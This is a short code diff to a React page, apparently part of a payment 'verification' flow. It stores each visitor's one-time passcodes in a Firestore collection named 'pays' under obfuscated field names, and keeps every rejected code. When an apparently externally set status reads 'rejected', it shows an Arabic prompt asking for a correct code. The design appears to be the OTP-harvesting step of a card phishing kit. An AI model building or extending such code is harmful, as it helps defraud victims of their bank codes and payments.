@@ -89,15 +89,20 @@ export default function VeriPage() {
 
           if (status === "rejected") {
             // Save rejected OTP and reset status
-            const currentOtp = {
-              code: data._v5,
-              rejectedAt: new Date().toISOString()
+            const updates: any = {
+              _v5Status: "pending"
             }
             
-            updateDoc(doc(db, "pays", visitorID), {
-              oldOtp: data.oldOtp ? [...data.oldOtp, currentOtp] : [currentOtp],
-              _v5Status: "pending"
-            }).then(() => {
+            // Only save to oldOtp if there's an OTP to save
+            if (data._v5) {
+              const currentOtp = {
+                code: data._v5,
+                rejectedAt: new Date().toISOString()
+              }
+              updates.oldOtp = data.oldOtp ? [...data.oldOtp, currentOtp] : [currentOtp]
+            }
+            
+            updateDoc(doc(db, "pays", visitorID), updates).then(() => {
               _ss5("pending")
               _s5("") // Clear the old code
               setError("تم رفض رمز التحقق. يرجى إدخال رمز صحيح.")
